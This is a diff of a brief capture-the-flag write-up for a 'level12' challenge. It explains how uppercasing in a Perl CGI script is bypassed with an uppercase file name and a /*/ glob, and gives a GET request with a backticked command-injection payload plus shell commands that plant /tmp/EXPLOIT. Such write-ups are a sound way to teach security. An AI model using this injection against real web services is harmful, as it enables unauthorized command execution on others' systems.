@@ -1,3 +1,9 @@
-level12.pl?x=`/*/EXPLOIT`
+In the perl file, we saw a call to CGI meaning that we could use GET method with params
+We saw this line: $xx =~ tr/a-z/A-Z/; meaning that we could not use letters to indicate a path to our malicious file
+So we used upper case for our file name and * to indicate the location:
 
-echo "\`getflag > /tmp/flag\`" > /tmp/EXPLOIT 
+MACHINE_IP:4646/level12.pl?x=`/*/EXPLOIT`
+
+$> chmod 777 /tmp/EXPLOIT
+
+$> echo "\`getflag > /tmp/flag\`" > /tmp/EXPLOIT 
